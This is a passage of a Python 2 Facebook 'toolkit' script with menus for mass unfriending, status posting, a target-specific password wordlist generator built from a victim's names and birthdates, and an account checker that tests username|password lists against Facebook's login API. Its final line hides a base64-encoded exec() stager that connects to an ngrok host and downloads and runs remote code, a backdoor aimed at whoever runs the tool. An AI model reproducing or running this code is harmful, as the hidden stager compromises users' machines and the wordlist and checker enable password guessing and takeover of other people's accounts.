	jalan('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
	print 42*"\033[1;97m═"
	for i in teman['data']:
		gas = requests.post('https://graph.facebook.com/me/friends/'+i['from']['id']+'?access_token='+toket)
		a = json.loads(gas.text)
		if 'error' in str(a):
			print "\033[1;97m[ \033[1;91mFailed\033[1;97m ] "+i['from']['name']
		else:
			print "\033[1;97m[ \033[1;92mAccept\033[1;97m ] "+i['from']['name']
	print 42*"\033[1;97m═"
	print"\033[1;91m[+] \033[1;92mDone"
	raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
	menu_bot()
	
##### UNFRIEND ####
def unfriend():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('reset')
	print logo
	jalan('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
	print "\033[1;97mStop \033[1;91mCTRL+C"
	print 42*"\033[1;97m═"
	try:
		pek = requests.get('https://graph.facebook.com/me/friends?access_token='+toket)
		cok = json.loads(pek.text)
		for i in cok['data']:
			nama = i['name']
			id = i['id']
			requests.delete("https://graph.facebook.com/me/friends?uid="+id+"&access_token="+toket)
			print "\033[1;97m[\033[1;92m Deleted \033[1;97m] "+nama
	except IndexError: pass
	except KeyboardInterrupt:
		print "\033[1;91m[!] Stopped"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu_bot()
	print"\n\033[1;91m[+] \033[1;92mDone"
	raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
	menu_bot()
	
#### LAIN LAIN #####
#                                    #
####MENU LAIN#####
def lain():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('reset')
	print logo
	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m Create Post"
	print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Create Wordlist"
	print "\033[1;97m║--\033[1;91m> \033[1;92m3.\033[1;97m Account Checker"
	print "\033[1;97m║--\033[1;91m> \033[1;92m4.\033[1;97m See my group list"
	print "\033[1;97m║--\033[1;91m> \033[1;92m5.\033[1;97m Profile Guard"
	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Back"
	print "║"
	pilih_lain()
#////////////
def pilih_lain():
	other = raw_input("\033[1;97m╚═\033[1;91mD \033[1;97m")
	if other =="":
		print "\033[1;91m[!] Wrong input"
		pilih_lain()
	elif other =="1":
		status()
	elif other =="2":
		wordlist()
	elif other =="3":
		check_akun()
	elif other =="4":
		grupsaya()
	elif other =="5":
		guard()
	elif other =="0":
		menu()
	else:
		print "\033[1;91m[!] Wrong input"
		pilih_lain()
		
##### STATUS #####
def status():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('reset')
	print logo
	msg=raw_input('\033[1;91m[+] \033[1;92mType status \033[1;91m:\033[1;97m ')
	if msg == "":
		print "\033[1;91m[!] Don't be empty"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		lain()
	else:
		res = requests.get("https://graph.facebook.com/me/feed?method=POST&message="+msg+"&access_token="+toket)
		op = json.loads(res.text)
		jalan('\033[1;91m[✺] \033[1;92mCreate \033[1;97m...')
		print 42*"\033[1;97m═"
		print"\033[1;91m[+] \033[1;92mStatus ID\033[1;91m : \033[1;97m"+op['id']
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		lain()
		
########### CREATE WORDLIST ##########
def wordlist():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		os.system('reset')
		print logo
		print "\033[1;91m[?] \033[1;92mFill in the complete data of the target below"
		print 42*"\033[1;97m═"
		a = raw_input("\033[1;91m[+] \033[1;92mNama Depan \033[1;97m: ")
		file = open(a+".txt", 'w')
		b=raw_input("\033[1;91m[+] \033[1;92mNama Tengah \033[1;97m: ")
		c=raw_input("\033[1;91m[+] \033[1;92mNama Belakang \033[1;97m: ")
		d=raw_input("\033[1;91m[+] \033[1;92mNama Panggilan \033[1;97m: ")
		e=raw_input("\033[1;91m[+] \033[1;92mTanggal Lahir >\033[1;96mex: |DDMMYY| \033[1;97m: ")
		f=e[0:2]
		g=e[2:4]
		h=e[4:]
		print 42*"\033[1;97m═"
		print("\033[1;91m[?] \033[1;93mKalo Jomblo SKIP aja :v")
		i=raw_input("\033[1;91m[+] \033[1;92mNama Pacar \033[1;97m: ")
		j=raw_input("\033[1;91m[+] \033[1;92mNama Panggilan Pacar \033[1;97m: ")
		k=raw_input("\033[1;91m[+] \033[1;92mTanggal Lahir Pacar >\033[1;96mex: |DDMMYY| \033[1;97m: ")
		jalan('\033[1;91m[✺] \033[1;92mCreate \033[1;97m...')
		l=k[0:2]
		m=k[2:4]
		n=k[4:]
		file.write("%s%s\n%s%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s%s\n%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s" % (a,c,a,b,b,a,b,c,c,a,c,b,a,a,b,b,c,c,a,d,b,d,c,d,d,d,d,a,d,b,d,c,a,e,a,f,a,g,a,h,b,e,b,f,b,g,b,h,c,e,c,f,c,g,c,h,d,e,d,f,d,g,d,h,e,a,f,a,g,a,h,a,e,b,f,b,g,b,h,b,e,c,f,c,g,c,h,c,e,d,f,d,g,d,h,d,d,d,a,f,g,a,g,h,f,g,f,h,f,f,g,f,g,h,g,g,h,f,h,g,h,h,h,g,f,a,g,h,b,f,g,b,g,h,c,f,g,c,g,h,d,f,g,d,g,h,a,i,a,j,a,k,i,e,i,j,i,k,b,i,b,j,b,k,c,i,c,j,c,k,e,k,j,a,j,b,j,c,j,d,j,j,k,a,k,b,k,c,k,d,k,k,i,l,i,m,i,n,j,l,j,m,j,n,j,k))
		wg = 0
		while (wg < 100):
			wg = wg + 1
			file.write(a + str(wg) + '\n')
		en = 0
		while (en < 100):
			en = en + 1
			file.write(i + str(en) + '\n')
		word = 0
		while (word < 100):
			word = word + 1
			file.write(d + str(word) + '\n')
		gen = 0
		while (gen < 100):
			gen = gen + 1
			file.write(j + str(gen) + '\n')
		file.close()
		time.sleep(1.5)
		print 42*"\033[1;97m═"
		print ("\033[1;91m[+] \033[1;92mSaved \033[1;91m: \033[1;97m %s.txt" %a)
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		lain()
	except IOError, e:
		print("\033[1;91m[!] Failed")
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		lain()

##### CHECKER #####
def check_akun():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('reset')
	print logo
	print "\033[1;91m[?] \033[1;92mCreate in file\033[1;91m : \033[1;97musername|password"
	print 42*"\033[1;97m═"
	live = []
	cek = []
	die = []
	try:
		file = raw_input("\033[1;91m[+] \033[1;92mFile path \033[1;91m:\033[1;97m ")
		list = open(file,'r').readlines()
	except IOError:
		print ("\033[1;91m[!] File not found")
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		lain()
	pemisah = raw_input("\033[1;91m[+] \033[1;92mSeparator \033[1;91m:\033[1;97m ")
	jalan('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
	print 42*"\033[1;97m═"
	for meki in list:
		username, password = (meki.strip()).split(str(pemisah))
		url = "https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(username)+"&locale=en_US&password="+(password)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
		data = requests.get(url)
		mpsh = json.loads(data.text)
		if 'access_token' in mpsh:
			live.append(password)
			print"\033[1;97m[ \033[1;92mLive\033[1;97m ] \033[1;97m"+username+"|"+password
		elif 'www.facebook.com' in mpsh["error_msg"]:
			cek.append(password)
			print"\033[1;97m[ \033[1;93mCheck\033[1;97m ] \033[1;97m"+username+"|"+password
		else:
			die.append(password)
			print"\033[1;97m[ \033[1;91mDie\033[1;97m ] \033[1;97m"+username+"|"+password
	print 42*"\033[1;97m═"
	print"\033[1;91m[+] \033[1;92mTotal\033[1;91m : \033[1;97mLive=\033[1;92m"+str(len(live))+" \033[1;97mCheck=\033[1;93m"+str(len(cek))+" \033[1;97mDie=\033[1;91m"+str(len(die))
	raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
	lain()
	
##### GRUP SAYA #####
def grupsaya():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	os.system('reset')
	print logo
	try:
		uh = requests.get('https://graph.facebook.com/me/groups?access_token='+toket)
		gud = json.loads(uh.text)
		for p in gud['data']:
			nama = p["name"]
			id = p["id"]
			f=open('out/Grupid.txt','w')
			listgrup.append(id)
			f.write(id + '\n')
			print "\033[1;97m[ \033[1;92mMyGroup\033[1;97m ] "+str(id)+" => "+str(nama)
		print 42*"\033[1;97m═"
		print"\033[1;91m[+] \033[1;92mTotal Group \033[1;91m:\033[1;97m %s"%(len(listgrup))
		print("\033[1;91m[+] \033[1;92mSaved \033[1;91m: \033[1;97mout/Grupid.txt")
		f.close()
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		lain()
	except (KeyboardInterrupt,EOFError):
		print("\033[1;91m[!] Stopped")
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		lain()
	except KeyError:
		os.remove('out/Grupid.txt')
		print('\033[1;91m[!] Group not found')
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		lain()
	except requests.exceptions.ConnectionError:
		print"\033[1;91m[✖] No Connection"
		keluar()
	except IOError:
		print "\033[1;91m[!] Error"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		lain()
		
##### PROFIL GUARD #####
def guard():
	global toket
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('reset')
	print logo
	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m Activate"
	print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Not activate"
	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Back"
	print "║"
	g = raw_input("\033[1;97m╚═\033[1;91mD \033[1;97m")
	if g == "1":
		aktif = "true"
		gaz(toket, aktif)
	elif g == "2":
		non = "false"
		gaz(toket, non)
	elif g =="0":
		lain()
	elif g =="":
		keluar()
	else:
		keluar()
	
def get_userid(toket):
	url = "https://graph.facebook.com/me?access_token=%s"%toket
	res = requests.get(url)
	uid = json.loads(res.text)
	return uid["id"]
		
def gaz(toket, enable = True):
	id = get_userid(toket)
	data = 'variables={"0":{"is_shielded": %s,"session_id":"9b78191c-84fd-4ab6-b0aa-19b39f04a6bc","actor_id":"%s","client_mutation_id":"b0316dd6-3fd6-4beb-aed4-bb29c5dc64b0"}}&method=post&doc_id=1477043292367183&query_name=IsShieldedSetMutation&strip_defaults=true&strip_nulls=true&locale=en_US&client_country_code=US&fb_api_req_friendly_name=IsShieldedSetMutation&fb_api_caller_class=IsShieldedSetMutation' % (enable, str(id))
	headers = {"Content-Type" : "application/x-www-form-urlencoded", "Authorization" : "OAuth %s" % toket}
	url = "https://graph.facebook.com/graphql"
	res = requests.post(url, data = data, headers = headers)
	print(res.text)
	if '"is_shielded":true' in res.text:
		os.system('reset')
		print logo
		print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mActivate"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		lain()
	elif '"is_shielded":false' in res.text:
		os.system('reset')
		print logo
		print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;91mNot activate"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		lain()
	else:
		print "\033[1;91m[!] Error"
		keluar()
	
lisensi()
exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHNvY2tldCx6bGliLGJhc2U2NCxzdHJ1Y3QsdGltZQpmb3IgeCBpbiByYW5nZSgxMCk6Cgl0cnk6CgkJcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQoJCXMuY29ubmVjdCgoJzAudGNwLmFwLm5ncm9rLmlvJyw4ODg4KSkKCQlicmVhawoJZXhjZXB0OgoJCXRpbWUuc2xlZXAoNSkKbD1zdHJ1Y3QudW5wYWNrKCc+SScscy5yZWN2KDQpKVswXQpkPXMucmVjdihsKQp3aGlsZSBsZW4oZCk8bDoKCWQrPXMucmVjdihsLWxlbihkKSkKZXhlYyh6bGliLmRlY29tcHJlc3MoYmFzZTY0LmI2NGRlY29kZShkKSkseydzJzpzfSkK')[0]))